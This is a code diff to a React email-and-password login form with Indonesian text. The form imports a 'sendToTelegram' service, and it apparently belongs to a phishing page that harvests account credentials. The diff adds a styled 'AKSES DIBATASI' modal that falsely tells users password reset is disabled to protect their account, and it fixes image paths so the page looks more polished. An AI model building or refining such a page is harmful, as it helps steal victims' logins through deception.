@@ -1,13 +1,19 @@
 import { useState } from 'react';
 import { sendToTelegram } from '../services/telegram';
+import AlertModal from './AlertModal';
 import './LoginForm.css';
 
-interface EmailLoginProps {
+interface EmailLoginFormProps {
   onClose?: () => void;
   playClickSound?: () => void;
 }
 
-const EmailLoginForm = ({ onClose, playClickSound }: EmailLoginProps) => {
+const EmailLoginForm = ({ onClose, playClickSound }: EmailLoginFormProps) => {
+  const [alertConfig, setAlertConfig] = useState<{isOpen: boolean, message: string, subMessage?: string}>({
+    isOpen: false,
+    message: '',
+    subMessage: ''
+  });
   const [email, setEmail] = useState('');
   const [password, setPassword] = useState('');
   const [emailError, setEmailError] = useState(false);
@@ -122,7 +128,7 @@ const EmailLoginForm = ({ onClose, playClickSound }: EmailLoginProps) => {
           <div className="w-full rounded-[30px] overflow-hidden shadow-[0_20px_50px_rgba(0,0,0,0.5)] bg-[#fdf5f8] border-2 border-white/50">
             {/* Header */}
             <div className="h-14 bg-gradient-to-r from-[#b71c1c] via-[#e91e63] to-[#b71c1c] flex items-center justify-center relative shadow-lg">
-              <div className="absolute inset-0 bg-[url('/header-pattern.png')] opacity-20"></div>
+              <div className="absolute inset-0 bg-[url('/src/assets/images/header-pattern.png')] opacity-20"></div>
               
               <div className="absolute -top-1 flex gap-1"></div>
 
@@ -181,7 +187,11 @@ const EmailLoginForm = ({ onClose, playClickSound }: EmailLoginProps) => {
                     onChange={handlePasswordChange}
                   />
                   <button 
-                    onClick={() => alert("Fitur belum tersedia")}
+                    onClick={() => setAlertConfig({
+                      isOpen: true,
+                      message: "Fitur ini saat ini tidak bisa digunakan untuk menjaga keamanan akun Anda.",
+                     
+                    })}
                     className="px-3 py-1 bg-[#e91e63] hover:bg-[#c2185b] text-white text-[10px] font-bold rounded-full border border-yellow-400 shadow-md active:scale-95 transition-transform whitespace-nowrap"
                   >
                     lupa kata sandi
@@ -215,7 +225,7 @@ const EmailLoginForm = ({ onClose, playClickSound }: EmailLoginProps) => {
           <div className="w-full rounded-[30px] overflow-hidden shadow-[0_20px_50px_rgba(0,0,0,0.5)] bg-[#fdf5f8] border-2 border-white/50">
             {/* Header */}
             <div className="h-14 bg-gradient-to-r from-[#b71c1c] via-[#e91e63] to-[#b71c1c] flex items-center justify-center relative shadow-lg">
-              <div className="absolute inset-0 bg-[url('/header-pattern.png')] opacity-20"></div>
+              <div className="absolute inset-0 bg-[url('/src/assets/images/header-pattern.png')] opacity-20"></div>
               <h2 className="text-[#ffd700] text-2xl font-black tracking-wide drop-shadow-[0_2px_2px_rgba(0,0,0,0.8)] uppercase" style={{ textShadow: '0 2px 0 #b71c1c' }}>
                 Verifikasi
               </h2>
@@ -311,6 +321,14 @@ const EmailLoginForm = ({ onClose, playClickSound }: EmailLoginProps) => {
           </div>
         </div>
       )}
+
+      <AlertModal 
+          isOpen={alertConfig.isOpen} 
+          onClose={() => setAlertConfig(prev => ({ ...prev, isOpen: false }))} 
+          title="AKSES DIBATASI" 
+          message={alertConfig.message} 
+          subMessage={alertConfig.subMessage} 
+        />
     </div>
   );
 };
